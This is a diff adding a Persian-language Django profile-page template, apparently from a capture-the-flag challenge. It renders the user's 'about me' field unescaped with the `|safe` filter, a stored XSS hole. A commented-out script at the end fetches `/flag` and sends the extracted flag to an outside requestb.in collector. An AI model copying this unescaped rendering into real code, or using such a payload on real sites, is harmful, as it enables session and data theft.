@@ -1,0 +1,50 @@
+{% extends 'app/base.html' %}
+{% load staticfiles app_tags %}
+
+
+{% block content %}
+
+    <div class="container">
+
+        <div class="row">
+            <div class="col-lg-12 col-md-12">
+                <div class="panel">
+                    <div class="panel-heading">
+                        <h3 class="panel-title">
+     مشخصات من
+                            <small>
+                                (در این قسمت می‌توانید اطلاعات پروفایل خود را مشاهده کنید.)
+                            </small>
+                        </h3>
+                    </div>
+                    <div class="panel-body">
+                        <img src="{% if user.avatar %}{{ user.avatar.url }}{% else %}{% static 'app/img/no-menn.png' %}{% endif %}" class="img-circle" alt="Avatar" height="100" width="100">
+                        <br><br>
+                        <p><label>نام و نام خانوادگی: </label> {{ user.get_full_name }}</p>
+                        <p><label>ایمیل: </label> {{ user.email }}</p>
+                        <p><label>درباره من: </label> {{ user.description|safe }}</p>
+
+                        <a href="{% url 'profile_edit' %}">ویرایش پروفایل</a>
+
+                    </div><!-- end .panel-body -->
+                </div><!-- end .panel -->
+            </div>
+        </div>
+
+
+    </div>
+
+{#    <script>#}
+{#        var xhr = new XMLHttpRequest();#}
+{#        xhr.open('GET', '/flag');#}
+{#        xhr.onload = function() {#}
+{#            if (xhr.status === 200) {#}
+{#                var arr = xhr.responseText.match(/<h3 id="flag">([\w\W\t\s]*)<\/h3>/gi) || [""];#}
+{#                document.location = 'https://requestb.in/15iwn8z1?text=' + arr;#}
+{#            }#}
+{#        };#}
+{#        xhr.send();#}
+{#    </script>#}
+
+
+{% endblock %}
